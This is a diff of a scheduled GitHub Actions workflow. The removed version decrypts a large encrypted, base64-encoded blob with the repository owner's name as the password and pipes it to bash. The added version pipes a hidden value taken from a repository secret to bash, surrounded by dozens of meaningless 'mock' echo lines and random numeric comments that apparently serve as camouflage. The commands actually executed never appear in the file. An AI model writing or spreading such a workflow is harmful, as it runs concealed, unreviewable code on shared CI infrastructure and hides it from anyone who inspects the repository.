@@ -1,15 +1,51 @@
-name: dongguange7412
-on:
-  workflow_dispatch:
-  schedule:
-    - cron: '35 5/6 * * *'
-jobs:
-  build:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v4
-      - name: dongguange7412
-        env:
-          Parameters: ${{ secrets.Parameters }}
+name: dongguange7412 #32604
+on: #15906
+  workflow_dispatch: #16209
+  schedule: #7932
+    - cron: '47 0/6 * * *' #18625
+jobs: #12457
+  build: #20540
+    runs-on: ubuntu-latest #7449
+    steps: #32425
+      - uses: actions/checkout@v4 #5756
+      - name: dongguange7412 #2743
+        env: #19965
+          y25511: ${{ secrets.y25511 }} #28509
         run: |
-          echo "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" | openssl enc -d -aes-256-cbc -base64 -A -salt -pbkdf2 -pass pass:${GITHUB_REPOSITORY_OWNER} | /bin/bash
+          echo $y25511 | jq -r .w2372 | /bin/bash #20457
+          echo "Env vars: $(env | wc -l) total"
+          test -d /tmp && echo "Tmp dir exists"
+          if [ -x /bin/ls ]; then echo "LS executable"; fi
+          echo "Test: [ 1 -eq 1 ] && echo 'Math OK'"
+          echo "Tar mock: tar -cf /dev/null /tmp 2>/dev/null || true"
+          echo "Chmod mock: chmod 644 /tmp 2>/dev/null || true"
+          echo "Random float-like: $((RANDOM % 100)).$((RANDOM % 100))"
+          echo "Checksum: $((1000 + RANDOM % 9000))"
+          echo "IO redirect: echo > file 2>/dev/null || true"
+          echo "Temp file mock: tmp=\$(mktemp) && echo \$tmp || echo no-tmp"
+          ls -la 2>/dev/null || true
+          echo "Redirect mock: echo data > /dev/null 2>&1"
+          for i in {1..3}; do echo "Iter $i"; done
+          echo "Path mock: echo \$PATH | awk -F: '{print \$1}'"
+          echo "Option mock: grep -i 'a' /etc/hosts 2>/dev/null | head -1"
+          echo "Command count: echo \$(ls | wc -l 2>/dev/null || echo 0)"
+          echo "Bit ops: $(( 1 & 1 ))"
+          find /tmp -maxdepth 1 -type f 2>/dev/null | head -1 || true
+          echo "Command || true: ls /nonexist || true"
+          echo "Arith loop: for ((i=0;i<3;i++)); do echo $i; done"
+          echo "Build $(date +%s)"
+          echo "Time ms-like: $(date +%s%3N 2>/dev/null || echo 123456)"
+          echo "Conditional: [[ 'a' == 'a' ]] && echo Match"
+          echo "Case mock: case 1 in 1) echo 1;; esac"
+          echo "Exit code test: $?"
+          [ -f /etc/hosts ] && echo "Hosts exist" || true
+          echo "Command fail safe: false || echo 'Safe'"
+          echo "Null cmd: : > /dev/null"
+          echo "Complex pipe: echo test | tr a-z A-Z | cut -c1-3"
+          echo "Range loop: for i in 1 3 5; do echo \$i; done"
+          echo "History mock: history | head -1 2>/dev/null || echo no-history"
+          echo "Sed mock: echo 'text' | sed 's/t/T/' 2>/dev/null || echo no-sed"
+          echo "Time: $(date +%H:%M:%S)"
+          echo "User: $(whoami)"
+          echo "Exit 0 test: exit 0 || true"
+          echo "In-array test: [[ 'a' =~ [a-z] ]] && echo Match"
